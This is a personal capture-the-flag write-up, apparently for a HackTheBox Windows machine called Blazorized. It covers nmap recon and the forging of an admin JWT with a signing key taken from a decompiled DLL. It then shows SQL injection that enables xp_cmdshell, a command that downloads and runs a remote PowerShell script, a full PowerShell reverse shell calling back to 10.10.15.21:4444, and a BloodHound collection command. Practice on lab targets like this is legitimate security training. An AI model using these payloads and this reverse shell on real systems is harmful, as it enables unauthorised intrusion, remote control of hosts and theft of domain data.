# export ip=`10.129.121.248`

# date : 30-06-24 || Rohit Tiwari

# os: `windows` & `IIs 10.0 server`

# Nmap scan

>  Command : `nmap -p- --min-rate 100000 $ip`

```
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
1433/tcp  open  ms-sql-s
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown
49672/tcp open  unknown
49680/tcp open  unknown
49705/tcp open  unknown
49776/tcp open  unknown
54119/tcp open  unknown
```

> Full port scan

```
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Did not follow redirect to http://blazorized.htb
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-30 08:17:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ms-sql-info: 
|   10.129.121.248\BLAZORIZED: 
|     Instance name: BLAZORIZED
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|     TCP port: 1433
|_    Clustered: false
| ms-sql-ntlm-info: 
|   10.129.121.248\BLAZORIZED: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2024-06-30T08:18:32+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-30T00:39:47
| Not valid after:  2054-06-30T00:39:47
| MD5:   85fa:b405:d350:0874:f33a:9fcb:c536:9620
|_SHA-1: 0aa1:f613:7032:5fb3:f27f:1c13:f620:d0f9:4217:1ed3
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: blazorized.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49671/tcp open  msrpc         Microsoft Windows RPC
49672/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49776/tcp open  ms-sql-s      Microsoft SQL Server 2022 16.00.1115.00; RC0+
| ms-sql-ntlm-info: 
|   10.129.121.248:49776: 
|     Target_Name: BLAZORIZED
|     NetBIOS_Domain_Name: BLAZORIZED
|     NetBIOS_Computer_Name: DC1
|     DNS_Domain_Name: blazorized.htb
|     DNS_Computer_Name: DC1.blazorized.htb
|     DNS_Tree_Name: blazorized.htb
|_    Product_Version: 10.0.17763
|_ssl-date: 2024-06-30T08:18:32+00:00; 0s from scanner time.
| ms-sql-info: 
|   10.129.121.248:49776: 
|     Version: 
|       name: Microsoft SQL Server 2022 RC0+
|       number: 16.00.1115.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RC0
|       Post-SP patches applied: true
|_    TCP port: 49776
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 3072
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-06-30T00:39:47
| Not valid after:  2054-06-30T00:39:47
| MD5:   85fa:b405:d350:0874:f33a:9fcb:c536:9620

```

# Summary of the scan

> Found two http port one at port 80 and other one at port 5985
# Port 80

- [x] manual visiting  && and enumeration
- [ ] fuzzing 

> On visiting the port 80 found a markdown payload 

![](Attachments/Pasted%20image%2020240630135158.png)

>okay so it taking input and working

![](Attachments/Pasted%20image%2020240630135321.png)

> Alright so this markdwdown 

jwt token enumeration


> On checking check for update found `jwt token`

![](Attachments/Pasted%20image%2020240701131305.png)

[jwt.io](https://jwt.io) found this

![](Attachments/Pasted%20image%2020240701131454.png)

> The jwt token 

```jwt
eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlBvc3RzX0dldF9BbGwiLCJDYXRlZ29yaWVzX0dldF9BbGwiXSwiZXhwIjoxNzE5ODE5NzgwLCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiJ9.C1hPoBzI-k0P9cc5DCTiSvJIOsUPe_vtWdyCdTszZ_ADHXX1vQB7bzRBA_vYH5m7U_r1KBrRw3uCpmpw0TnH1Q
```

>  After enumerating a framework json and got some dll
>  mainly `Blazorized.digitalgar.dll`

![](Attachments/Pasted%20image%2020240701150504.png)

![](Attachments/Pasted%20image%2020240701150516.png)


> After that downloaded vs code and ilspy to decomile the dll and in helper.dll found key for jwt encryption


![](Attachments/Pasted%20image%2020240701150615.png)


```c
static JWT()

{

jwtSymmetricSecurityKey = "8697800004ee25fc33436978ab6e2ed6ee1a97da699a53a53d96cc4d08519e185d14727ca18728bf1efcde454eea6f65b8d466a4fb6550d5c795d9d9176ea6cf021ef9fa21ffc25ac40ed80f4a4473fc1ed10e69eaf957cfc4c67057e547fadfca95697242a2ffb21461e7f554caa4ab7db07d2d897e7dfbe2c0abbaf27f215c0ac51742c7fd58c3cbb89e55ebb4d96c8ab4234f2328e43e095c0f55f79704c49f07d5890236fe6b4fb50dcd770e0936a183d36e4d544dd4e9a40f5ccf6d471bc7f2e53376893ee7c699f48ef392b382839a845394b6b93a5179d33db24a2963f4ab0722c9bb15d361a34350a002de648f13ad8620750495bff687aa6e2f298429d6c12371be19b0daa77d40214cd6598f595712a952c20eddaae76a28d89fb15fa7c677d336e44e9642634f32a0127a5bee80838f435f163ee9b61a67e9fb2f178a0c7c96f160687e7626497115777b80b7b8133cef9a661892c1682ea2f67dd8f8993c87c8c9c32e093d2ade80464097e6e2d8cf1ff32bdbcd3dfd24ec4134fef2c544c75d5830285f55a34a525c7fad4b4fe8d2f11af289a1003a7034070c487a18602421988b74cc40eed4ee3d4c1bb747ae922c0b49fa770ff510726a4ea3ed5f8bf0b8f5e1684fb1bccb6494ea6cc2d73267f6517d2090af74ceded8c1cd32f3617f0da00bf1959d248e48912b26c3f574a1912ef1fcc2e77a28b53d0a";

superAdminEmailClaimValue = "superadmin@blazorized.htb";

postsPermissionsClaimValue = "Posts_Get_All";

categoriesPermissionsClaimValue = "Categories_Get_All";

superAdminRoleClaimValue = "Super_Admin";

issuer = "http://api.blazorized.htb";

apiAudience = "http://api.blazorized.htb";

adminDashboardAudience = "http://admin.blazorized.htb";

}
```


> After that tried to use jwt and change the jwt content of the token and got 

![](Attachments/Pasted%20image%2020240709012804.png)


>Payload

```
 "http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress": "superadmin@blazorized.htb",
  "http://schemas.microsoft.com/ws/2008/06/identity/claims/role": [
    "Super_Admin"
  ],
  "exp": 1720488444,
  "iss": "http://api.blazorized.htb",
  "aud": "http://admin.blazorized.htb"
}
```

> Note : Make sure to upadate the expiry time to altest so that it works 
> And then pasted the asymetric key into it and then used that to login on admin.blazorized.htb

![](Attachments/Pasted%20image%2020240709012934.png)


> Put key=jwt and value =  jwt token with update details and thenr resfresh


# Got the admin panel

![](Attachments/Pasted%20image%2020240709013037.png)


# Got sql injection in dashboard /duplicate page
- Enable xp_cmdshell using this
```
www'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
```

- Command Execution

```
www'; exec master..xp_cmdshell 'xxx';-- -
```

- Revshell using 
```
www';EXEC xp_cmdshell 'powershell -c "IEX (iwr -usebasicparsing http://10.10.15.21:80/revshell.ps1)"
```

> `Revershell`

```powershell
do {
    # Delay before establishing network connection, and between retries
    Start-Sleep -Seconds 1

    # Connect to C2
    try{
        $TCPClient = New-Object Net.Sockets.TCPClient('10.10.15.21', 4444)
    } catch {}
} until ($TCPClient.Connected)

$NetworkStream = $TCPClient.GetStream()
$StreamWriter = New-Object IO.StreamWriter($NetworkStream)

# Writes a string to C2
function WriteToStream ($String) {
    # Create buffer to be used for next network stream read. Size is determined by the TCP client recieve buffer (65536 by default)
    [byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0}

    # Write to C2
    $StreamWriter.Write($String + 'SHELL> ')
    $StreamWriter.Flush()
}

# Initial output to C2. The function also creates the inital empty byte array buffer used below.
WriteToStream ''

# Loop that breaks if NetworkStream.Read throws an exception - will happen if connection is closed.
while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {
    # Encode command, remove last byte/newline
    $Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1)
    
    # Execute command and save output (including errors thrown)
    $Output = try {
            Invoke-Expression $Command 2>&1 | Out-String
        } catch {
            $_ | Out-String
        }

    # Write output to C2
    WriteToStream ($Output)
}
# Closes the StreamWriter and the underlying TCPClient
$StreamWriter.Close()

```

Got 200 ok it download my revshell in it's directory

![](Attachments/Pasted%20image%2020240709020932.png)


> Again at url /revshell.ps1 got me the shell

![](Attachments/Pasted%20image%2020240709021012.png)

![](Attachments/Pasted%20image%2020240709021032.png)


Invoke-BloodHound -CollectionMethod All -Domain Blazorized.htb -zipFileName loot.zip